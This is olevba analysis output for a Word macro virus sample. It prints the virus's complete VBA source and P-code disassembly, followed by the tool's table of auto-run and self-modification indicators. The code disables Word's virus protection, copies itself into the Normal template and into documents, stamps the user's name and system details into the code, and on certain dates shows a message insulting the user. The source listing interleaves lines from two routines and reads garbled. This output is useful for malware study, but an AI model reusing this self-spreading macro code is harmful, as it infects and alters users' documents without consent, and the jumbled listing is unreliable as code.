olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Ded.x
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Ded.x - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen1()
Sub AutoClose1()
On Error GoTo out
On Error GoTo out
Options.VirusProtection = False
Options.SaveNormalPrompt = False
Options.VirusProtection = False
Options.ConfirmConversions = False
Options.SaveNormalPrompt = False
ad = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
nt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
Options.ConfirmConversions = False
If nt > 70 And ad > 0 Then GoTo out
ad = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
If nt < 70 Then
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
nt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
If nt > 70 And ad > 0 Then GoTo out
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys"
End If
If nt < 70 Then
If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
If Day(Now) = 14 And (Month(Now) > 5) Then MsgBox "I Think " & Application.UserName & " is a big stupid jerk!", 0, "VicodinES Loves You / Class.Poppy"
host.codemodule.AddFromFile ("c:\class.sys")
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
With host.codemodule
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys"
    For x = 1 To 4
    .deletelines 1
End If
    Next x
If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
End With
If nt < 70 Then
If Day(Now) = 14 And (Month(Now) > 5) Then MsgBox "I Think " & Application.UserName & " is a big stupid jerk!", 0, "VicodinES Loves You / Class.Poppy"
    With host.codemodule
host.codemodule.AddFromFile ("c:\class.sys")
    .replaceline 1, "Sub AutoClose()"
    .replaceline 71, "Sub ToolsMacro()"
With host.codemodule
    End With
    For x = 1 To 4
End If
With host.codemodule
    .deletelines 1
    For x = 2 To 72 Step 2
    Next x
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow & Application.Assistant
    Next x
End With
End With
If nt < 70 Then
out:
If nt > 70 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
    With host.codemodule
End Sub
    .replaceline 1, "Sub AutoClose()"
Sub ViewVBCode1()
End Sub
    .replaceline 71, "Sub ToolsMacro()"
    End With
End If
With host.codemodule
    For x = 2 To 72 Step 2
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow & Application.Assistant
    Next x
End With
out:
If nt > 70 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End Sub
Sub ToolsMacro1()
End Sub
Private Sub Document_Close()
On Error GoTo skam
Options.VirusProtection = False
SWLABS99
skam:
End Sub
Private Sub SWLABS99()
If Not ActiveDocument.VBProject.VBComponents(1).codemodule.Find("Document_Close", 1, 1, 1000, 1000, False, False) Then
    For i = 1 To NormalTemplate.VBProject.VBComponents(1).codemodule.CountOfLines
        d = NormalTemplate.VBProject.VBComponents(1).codemodule.Lines(i, 1)
        If Len(d) > 0 And Not d = " " And Not d = " _" And Not d = "" And Not Mid(d, 1, 1) = "'" Then
            While Mid(d, Len(d) - 1, 2) = " _"
                i = i + 1
                d = Left(d, Len(d) - 1) & NormalTemplate.VBProject.VBComponents(1).codemodule.Lines(i, 1)
            Wend
            ActiveDocument.VBProject.VBComponents(1).codemodule.InsertLines i * 2, d
        End If
    Next i
    ActiveDocument.SaveAs AddToRecentFiles:=False
Else
If Not NormalTemplate.VBProject.VBComponents(1).codemodule.Find("Document_Close", 1, 1, 1000, 1000, False, False) Then
    For i = 1 To ActiveDocument.VBProject.VBComponents(1).codemodule.CountOfLines
        d = ActiveDocument.VBProject.VBComponents(1).codemodule.Lines(i, 1)
        If Len(d) > 0 And Not d = " " And Not d = " _" And Not d = "" And Not Mid(d, 1, 1) = "'" Then
            While Mid(d, Len(d) - 1, 2) = " _"
                i = i + 1
                d = Left(d, Len(d) - 1) & ActiveDocument.VBProject.VBComponents(1).codemodule.Lines(i, 1)
            Wend
            NormalTemplate.VBProject.VBComponents(1).codemodule.InsertLines i * 2, d
        End If
    Next i
    NormalTemplate.Save
End If
End If
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Ded.x
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 7382 bytes
' Line #0:
' 	FuncDefn (Sub AutoOpen1())
' Line #1:
' 	FuncDefn (Sub AutoClose1())
' Line #2:
' 	OnError out 
' Line #3:
' 	OnError out 
' Line #4:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #5:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #6:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #7:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #8:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #9:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	MemLd CountOfLines 
' 	St ad 
' Line #10:
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	MemLd CountOfLines 
' 	St nt 
' Line #11:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #12:
' 	Ld nt 
' 	LitDI2 0x0046 
' 	Gt 
' 	Ld ad 
' 	LitDI2 0x0000 
' 	Gt 
' 	And 
' 	If 
' 	BoSImplicit 
' 	GoTo out 
' 	EndIf 
' Line #13:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	MemLd CountOfLines 
' 	St ad 
' Line #14:
' 	Ld nt 
' 	LitDI2 0x0046 
' 	Lt 
' 	IfBlock 
' Line #15:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set host 
' Line #16:
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	MemLd CountOfLines 
' 	St nt 
' Line #17:
' 	Ld host 
' 	MemLd New 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemSt New 
' Line #18:
' 	Ld nt 
' 	LitDI2 0x0046 
' 	Gt 
' 	Ld ad 
' 	LitDI2 0x0000 
' 	Gt 
' 	And 
' 	If 
' 	BoSImplicit 
' 	GoTo out 
' 	EndIf 
' Line #19:
' 	LitStr 0x000C "c:\class.sys"
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #20:
' 	EndIfBlock 
' Line #21:
' 	Ld nt 
' 	LitDI2 0x0046 
' 	Lt 
' 	IfBlock 
' Line #22:
' 	Ld ad 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set host 
' 	EndIf 
' Line #23:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set host 
' Line #24:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x000E 
' 	Eq 
' 	Ld Now 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0005 
' 	Gt 
' 	Paren 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0008 "I Think "
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	LitStr 0x0016 " is a big stupid jerk!"
' 	Concat 
' 	LitDI2 0x0000 
' 	LitStr 0x0021 "VicodinES Loves You / Class.Poppy"
' 	ArgsCall MsgBox 0x0003 
' 	EndIf 
' Line #25:
' 	LitStr 0x000C "c:\class.sys"
' 	Paren 
' 	Ld host 
' 	MemLd codemodule 
' 	ArgsMemCall AddFromFile 0x0001 
' Line #26:
' 	Ld host 
' 	MemLd New 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemSt New 
' Line #27:
' 	StartWithExpr 
' 	Ld host 
' 	MemLd codemodule 
' 	With 
' Line #28:
' 	LitStr 0x000C "c:\class.sys"
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #29:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0004 
' 	For 
' Line #30:
' 	LitDI2 0x0001 
' 	ArgsMemCallWith deletelines 0x0001 
' Line #31:
' 	EndIfBlock 
' Line #32:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #33:
' 	Ld ad 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set host 
' 	EndIf 
' Line #34:
' 	EndWith 
' Line #35:
' 	Ld nt 
' 	LitDI2 0x0046 
' 	Lt 
' 	IfBlock 
' Line #36:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x000E 
' 	Eq 
' 	Ld Now 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0005 
' 	Gt 
' 	Paren 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0008 "I Think "
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	LitStr 0x0016 " is a big stupid jerk!"
' 	Concat 
' 	LitDI2 0x0000 
' 	LitStr 0x0021 "VicodinES Loves You / Class.Poppy"
' 	ArgsCall MsgBox 0x0003 
' 	EndIf 
' Line #37:
' 	StartWithExpr 
' 	Ld host 
' 	MemLd codemodule 
' 	With 
' Line #38:
' 	LitStr 0x000C "c:\class.sys"
' 	Paren 
' 	Ld host 
' 	MemLd codemodule 
' 	ArgsMemCall AddFromFile 0x0001 
' Line #39:
' 	LitDI2 0x0001 
' 	LitStr 0x000F "Sub AutoClose()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #40:
' 	LitDI2 0x0047 
' 	LitStr 0x0010 "Sub ToolsMacro()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #41:
' 	StartWithExpr 
' 	Ld host 
' 	MemLd codemodule 
' 	With 
' Line #42:
' 	EndWith 
' Line #43:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0004 
' 	For 
' Line #44:
' 	EndIfBlock 
' Line #45:
' 	StartWithExpr 
' 	Ld host 
' 	MemLd codemodule 
' 	With 
' Line #46:
' 	LitDI2 0x0001 
' 	ArgsMemCallWith deletelines 0x0001 
' Line #47:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	LitDI2 0x0048 
' 	LitDI2 0x0002 
' 	ForStep 
' Line #48:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #49:
' 	Ld x 
' 	LitStr 0x0001 "'"
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	Ld Now 
' 	Concat 
' 	Ld Application 
' 	MemLd ActivePrinter 
' 	Concat 
' 	Ld Application 
' 	MemLd ActiveWindow 
' 	Concat 
' 	Ld Application 
' 	MemLd Assistant 
' 	Concat 
' 	ArgsMemCallWith replaceline 0x0002 
' Line #50:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #51:
' 	EndWith 
' Line #52:
' 	EndWith 
' Line #53:
' 	Ld nt 
' 	LitDI2 0x0046 
' 	Lt 
' 	IfBlock 
' Line #54:
' 	Label out 
' Line #55:
' 	Ld nt 
' 	LitDI2 0x0046 
' 	Gt 
' 	Ld ad 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' Line #56:
' 	StartWithExpr 
' 	Ld host 
' 	MemLd codemodule 
' 	With 
' Line #57:
' 	EndSub 
' Line #58:
' 	LitDI2 0x0001 
' 	LitStr 0x000F "Sub AutoClose()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #59:
' 	FuncDefn (Sub ViewVBCode1())
' Line #60:
' 	EndSub 
' Line #61:
' 	LitDI2 0x0047 
' 	LitStr 0x0010 "Sub ToolsMacro()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #62:
' 	EndWith 
' Line #63:
' 	EndIfBlock 
' Line #64:
' 	StartWithExpr 
' 	Ld host 
' 	MemLd codemodule 
' 	With 
' Line #65:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	LitDI2 0x0048 
' 	LitDI2 0x0002 
' 	ForStep 
' Line #66:
' 	Ld x 
' 	LitStr 0x0001 "'"
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	Ld Now 
' 	Concat 
' 	Ld Application 
' 	MemLd ActivePrinter 
' 	Concat 
' 	Ld Application 
' 	MemLd ActiveWindow 
' 	Concat 
' 	Ld Application 
' 	MemLd Assistant 
' 	Concat 
' 	ArgsMemCallWith replaceline 0x0002 
' Line #67:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #68:
' 	EndWith 
' Line #69:
' 	Label out 
' Line #70:
' 	Ld nt 
' 	LitDI2 0x0046 
' 	Gt 
' 	Ld ad 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' Line #71:
' 	EndSub 
' Line #72:
' 	FuncDefn (Sub ToolsMacro1())
' Line #73:
' 	EndSub 
' Line #74:
' 	FuncDefn (Private Sub Document_Close())
' Line #75:
' 	OnError skam 
' Line #76:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #77:
' 	ArgsCall SWLABS99 0x0000 
' Line #78:
' 	Label skam 
' Line #79:
' 	EndSub 
' Line #80:
' 	FuncDefn (Private Sub SWLABS99())
' Line #81:
' 	LitStr 0x000E "Document_Close"
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x03E8 
' 	LitDI2 0x03E8 
' 	LitVarSpecial (False)
' 	LitVarSpecial (False)
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd codemodule 
' 	ArgsMemLd Find 0x0007 
' 	Not 
' 	IfBlock 
' Line #82:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd codemodule 
' 	MemLd CountOfLines 
' 	For 
' Line #83:
' 	Ld i 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd codemodule 
' 	ArgsMemLd Lines 0x0002 
' 	St d 
' Line #84:
' 	Ld d 
' 	FnLen 
' 	LitDI2 0x0000 
' 	Gt 
' 	Ld d 
' 	LitStr 0x0001 " "
' 	Eq 
' 	Not 
' 	And 
' 	Ld d 
' 	LitStr 0x0002 " _"
' 	Eq 
' 	Not 
' 	And 
' 	Ld d 
' 	LitStr 0x0000 ""
' 	Eq 
' 	Not 
' 	And 
' 	Ld d 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 "'"
' 	Eq 
' 	Not 
' 	And 
' 	IfBlock 
' Line #85:
' 	Ld d 
' 	Ld d 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Sub 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0002 " _"
' 	Eq 
' 	While 
' Line #86:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Add 
' 	St i 
' Line #87:
' 	Ld d 
' 	Ld d 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd LBound 0x0002 
' 	Ld i 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd codemodule 
' 	ArgsMemLd Lines 0x0002 
' 	Concat 
' 	St d 
' Line #88:
' 	Wend 
' Line #89:
' 	Ld i 
' 	LitDI2 0x0002 
' 	Mul 
' 	Ld d 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd codemodule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #90:
' 	EndIfBlock 
' Line #91:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #92:
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #93:
' 	ElseBlock 
' Line #94:
' 	LitStr 0x000E "Document_Close"
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x03E8 
' 	LitDI2 0x03E8 
' 	LitVarSpecial (False)
' 	LitVarSpecial (False)
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd codemodule 
' 	ArgsMemLd Find 0x0007 
' 	Not 
' 	IfBlock 
' Line #95:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd codemodule 
' 	MemLd CountOfLines 
' 	For 
' Line #96:
' 	Ld i 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd codemodule 
' 	ArgsMemLd Lines 0x0002 
' 	St d 
' Line #97:
' 	Ld d 
' 	FnLen 
' 	LitDI2 0x0000 
' 	Gt 
' 	Ld d 
' 	LitStr 0x0001 " "
' 	Eq 
' 	Not 
' 	And 
' 	Ld d 
' 	LitStr 0x0002 " _"
' 	Eq 
' 	Not 
' 	And 
' 	Ld d 
' 	LitStr 0x0000 ""
' 	Eq 
' 	Not 
' 	And 
' 	Ld d 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 "'"
' 	Eq 
' 	Not 
' 	And 
' 	IfBlock 
' Line #98:
' 	Ld d 
' 	Ld d 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Sub 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0002 " _"
' 	Eq 
' 	While 
' Line #99:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Add 
' 	St i 
' Line #100:
' 	Ld d 
' 	Ld d 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd LBound 0x0002 
' 	Ld i 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd codemodule 
' 	ArgsMemLd Lines 0x0002 
' 	Concat 
' 	St d 
' Line #101:
' 	Wend 
' Line #102:
' 	Ld i 
' 	LitDI2 0x0002 
' 	Mul 
' 	Ld d 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd codemodule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #103:
' 	EndIfBlock 
' Line #104:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #105:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #106:
' 	EndIfBlock 
' Line #107:
' 	EndIfBlock 
' Line #108:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

